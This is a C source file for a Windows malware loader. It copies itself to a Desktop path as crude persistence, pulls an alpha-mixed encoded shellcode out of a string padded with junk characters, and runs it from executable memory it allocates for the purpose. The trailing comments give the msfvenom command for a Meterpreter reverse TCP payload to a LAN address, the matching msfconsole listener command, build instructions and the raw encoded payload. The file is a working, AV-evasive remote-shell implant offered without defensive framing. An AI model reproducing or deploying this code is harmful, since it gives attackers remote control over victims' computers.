#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

void persistence ();
int copy_file(char *old_filename, char  *new_filename);
void derandomize (const char *in_buf, char *out_buf, int junk);
int run ();
int sys_bineval(char *argv, size_t len);



void persistence (char *current_exe){
	//char path_agent [] = "C:\\Users\\Public\\Agent\\Agent.exe";
	//char path [] = "C:\\Users\\Public\\Agent\\";
	//char agent [] = "Agent.exe";

	char path_agent [] = "C:\\Users\\user\\Desktop\\LOL.exe";

	FILE * file;
	file = fopen("file_name", "r");
	if (file){
		fclose(file);
	}else{
		copy_file (current_exe, path_agent);
	}
}


int copy_file(char *old_filename, char  *new_filename) {
	FILE  *ptr_old, *ptr_new;
	errno_t err = 0, err1 = 0;
	int  a;

	err = fopen_s(&ptr_old, old_filename, "rb");
	err1 = fopen_s(&ptr_new, new_filename, "wb");

	if(err != 0)
		return  -1;

	if(err1 != 0) {
		fclose(ptr_old);
		return  -1;
	}

	while(1) {
		a  =  fgetc(ptr_old);

		if(!feof(ptr_old))
			fputc(a, ptr_new);
		else
			break;
	}

	fclose(ptr_new);
	fclose(ptr_old);
	return  0;
}


void derandomize (const char *in_buf, char *out_buf, int junk){
	
	int len = (size_t)strlen(in_buf);
	int pos = 0;
	int counter = 0;
	for (int i=0; i<len; i++){
		counter += 1;
		if ( (counter % (junk + 1)) == 0 ){
			out_buf[pos] = in_buf[i];
			pos += 1;
		}
	}
}



int main(int argc, char *argv[]){
	
	persistence (argv[0]);
	run ();
	exit(0);
}


int run (){

	char out_buff [762] = {};
	int junk = 4;
	char buff [] = 
	"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"
	"cTZ3f3zJydSrAoP8tTZviS0u7VaCATMUHA";

	derandomize (buff, out_buff, junk);

	size_t len;
	len = (size_t)strlen(out_buff);
	sys_bineval(out_buff, len);

	exit(0);
}

int sys_bineval(char *buf, size_t len)
{

	char *argv=buf;
	char *tempbuf=NULL;
	char *winmem;

	winmem = (char *) VirtualAlloc(NULL, len+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(winmem, argv, len+1);

	if (tempbuf!=NULL) {
		free(tempbuf);
	}

	__asm__ (
		"mov %0, %%eax\n"
		"call *%%eax\n"
		: // no output
		: "m"(winmem) // input
	);

	return 0;
}



// msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/alpha_mixed -f raw LHOST=192.168.1.27 LPORT=4444 EXITFUNC=thread BufferRegister=EAX
// msfconsole -x 'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run'

// make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe
// PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA